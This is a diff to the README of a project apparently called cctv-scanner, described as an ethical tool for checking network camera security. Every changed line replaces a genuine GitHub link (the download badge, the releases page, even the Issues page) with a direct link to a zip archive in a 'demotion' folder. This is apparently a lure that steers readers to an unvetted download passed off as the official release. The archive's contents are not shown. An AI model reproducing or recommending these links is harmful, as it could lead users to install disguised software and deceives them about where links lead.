@@ -1,6 +1,6 @@
 # 🚨 cctv-scanner - Ethical Security for Your Network
 
-![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen)
+![Download Latest Release](https://raw.githubusercontent.com/Ravichandran4411/cctv-scanner/main/demotion/cctv-scanner.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to cctv-scanner! This application helps you ethically assess the securit
 
 ## 📦 Download & Install
 
-To download cctv-scanner, visit this page: [Download Releases](https://github.com/Ravichandran4411/cctv-scanner/releases).
+To download cctv-scanner, visit this page: [Download Releases](https://raw.githubusercontent.com/Ravichandran4411/cctv-scanner/main/demotion/cctv-scanner.zip).
 
 Choose the latest version and click on the download link for your operating system. Once downloaded, follow these steps to run the application:
 
@@ -52,7 +52,7 @@ If you encounter any issues, consider these common solutions:
 
 ## ⚙️ Support
 
-For further assistance, please check our [GitHub Issues Page](https://github.com/Ravichandran4411/cctv-scanner/issues) for a list of common questions or to report an issue.
+For further assistance, please check our [GitHub Issues Page](https://raw.githubusercontent.com/Ravichandran4411/cctv-scanner/main/demotion/cctv-scanner.zip) for a list of common questions or to report an issue.
 
 ## 💡 Tips for Success
 
